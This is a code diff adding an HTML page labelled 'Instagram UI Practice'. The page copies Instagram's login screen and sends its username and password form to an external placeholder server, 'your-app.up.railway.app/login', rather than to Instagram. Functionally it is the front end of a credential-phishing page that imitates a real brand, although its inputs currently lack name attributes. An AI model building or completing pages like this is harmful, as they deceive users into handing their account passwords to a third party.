@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram UI Practice</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <h1 class="logo">Instagram</h1>
+        <div id="loader" class="loader"></div>
+
+        <form action="https://your-app.up.railway.app/login" method="POST">
+          <input type="text" placeholder="Phone number, username, or email" />
+
+          <input type="password" placeholder="Password" />
+
+          <button>Log In</button>
+        </form>
+
+        <div class="or">OR</div>
+
+        <p class="facebook" onclick="showLoader()">Log in with Facebook</p>
+
+        <a
+          href="#"
+          class="forgot"
+          onclick="
+            showLoader();
+            return false;
+          "
+          >Forgot password?</a
+        >
+      </div>
+
+      <div class="signup-box">
+        <p>
+          Don't have an account?
+          <a
+            href="#"
+            onclick="
+              showLoader();
+              return false;
+            "
+            >Sign up</a
+          >
+        </p>
+      </div>
+    </div>
+
+    <script src="./script.js"></script>
+  </body>
+</html>
